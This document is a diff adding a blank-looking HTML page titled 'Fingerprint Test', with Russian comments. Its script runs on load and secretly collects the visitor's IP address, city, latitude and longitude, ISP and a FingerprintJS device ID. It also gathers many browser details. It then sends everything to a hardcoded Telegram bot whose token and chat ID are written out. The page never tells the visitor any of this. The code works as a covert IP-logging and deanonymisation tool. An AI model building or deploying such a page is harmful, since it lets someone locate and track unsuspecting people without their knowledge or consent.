@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fingerprint Test</title>
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs-pro@3.0.0/dist/fingerprintjs-pro.min.js"></script>
+</head>
+<body>
+
+<script>
+// Функция для получения IP и геолокации клиента
+function getClientInfo() {
+  // Используем API ipwhois для динамической геолокации
+  fetch('https://ipwhois.app/json/')  // API для получения данных по IP пользователя
+    .then(response => response.json())  // Преобразуем ответ в JSON
+    .then(apiData => {
+      console.log('IP API Data:', apiData);  // Отладочная информация о полученных данных
+
+      // Извлекаем необходимые данные из ответа
+      const ip = apiData.ip || 'Unknown IP';  // IP-адрес клиента
+      const country = apiData.country || 'Unknown Country';  // Страна
+      const region = apiData.region || 'Unknown Region';  // Регион
+      const city = apiData.city || 'Unknown City';  // Город
+      const latitude = apiData.latitude || 'Unknown Latitude';  // Широта
+      const longitude = apiData.longitude || 'Unknown Longitude';  // Долгота
+      const isp = apiData.isp || 'Unknown ISP';  // Провайдер
+
+      // Получаем информацию о браузере (User-Agent)
+      const ua = navigator.userAgent;
+      const language = navigator.language || 'Unknown Language'; // Язык браузера
+      const platform = navigator.platform || 'Unknown Platform'; // Платформа (например, Windows, macOS)
+      const screenWidth = window.screen.width || 'Unknown Width'; // Ширина экрана
+      const screenHeight = window.screen.height || 'Unknown Height'; // Высота экрана
+      const colorDepth = window.screen.colorDepth || 'Unknown Color Depth'; // Глубина цвета экрана
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown Timezone'; // Часовой пояс
+      const isTouchDevice = 'ontouchstart' in window ? 'Yes' : 'No'; // Есть ли сенсорный экран
+
+      // Дополнительные данные о браузере и устройстве
+      const vendor = navigator.vendor || 'Unknown Vendor';  // Поставщик браузера (например, Google, Apple)
+      const appVersion = navigator.appVersion || 'Unknown App Version';  // Версия браузера
+      const isWebGLSupported = typeof WebGLRenderingContext !== 'undefined' ? 'Yes' : 'No'; // Поддержка WebGL
+      const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No'; // Включены ли cookies
+      const deviceMemory = navigator.deviceMemory || 'Unknown Device Memory';  // Память устройства (в ГБ)
+
+      // Время с момента загрузки страницы
+      const loadTime = (performance.now() / 1000).toFixed(2) + ' seconds';
+
+      // Тип устройства (мобильное или десктопное)
+      const deviceType = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(ua) ? 'Mobile' : 'Desktop';
+
+      // Использование FingerprintJS для более точной идентификации устройства
+      FingerprintJS.load().then(fp => {
+        fp.get().then(result => {
+          console.log('FingerprintJS Result:', result);  // Отладочная информация о результатах FingerprintJS
+
+          const deviceFingerprint = result.visitorId || 'Unknown Fingerprint';  // Уникальный отпечаток устройства
+          const brand = result.components.os.name || 'Unknown Brand';
+          const model = result.components.device.model || 'Unknown Model';
+          
+          // Формируем сообщение для отправки
+          const message = encodeURIComponent(
+            `IP: ${ip}\nCountry: ${country} ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\n\n` +
+            `User-Agent: ${ua}\nLanguage: ${language}\nPlatform: ${platform}\nScreen: ${screenWidth}x${screenHeight}\n` +
+            `Color Depth: ${colorDepth}-bit\nTimezone: ${timezone}\nTouch Device: ${isTouchDevice}\n` +
+            `Vendor: ${vendor}\nApp Version: ${appVersion}\nWebGL Support: ${isWebGLSupported}\nCookies Enabled: ${cookiesEnabled}\n` +
+            `Device Memory: ${deviceMemory} GB\nLoad Time: ${loadTime}\nDevice Type: ${deviceType}\n` +
+            `Brand: ${brand}\nModel: ${model}\nFingerprint: ${deviceFingerprint}`
+          );
+
+          // Настроим Telegram Bot API URL для отправки сообщения
+          const botToken = '1682820271:AAE3HGqITz6N5qyIcy3ODm6rOIypbBseAJ4';  // Ваш токен
+          const chatId = '669186959';  // Ваш чат ID
+          const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&parse_mode=html&text=${message}`;
+
+          // Отправляем данные в Telegram
+          fetch(telegramUrl)
+            .then(response => response.json())  // Преобразуем ответ от Telegram в JSON
+            .then(data => {
+              console.log('Message sent successfully:', data);
+            })
+            .catch(error => {
+              console.error('Error sending message:', error);
+            });
+        }).catch(error => {
+          console.error('Error with FingerprintJS:', error);
+        });
+      }).catch(error => {
+        console.error('FingerprintJS error:', error);
+      });
+    })
+    .catch(error => {
+      console.error('Error fetching IP details:', error);
+    });
+
+}
+
+// Вызов функции для получения и отправки информации
+getClientInfo();
+</script>
+
+</body>
+</html>
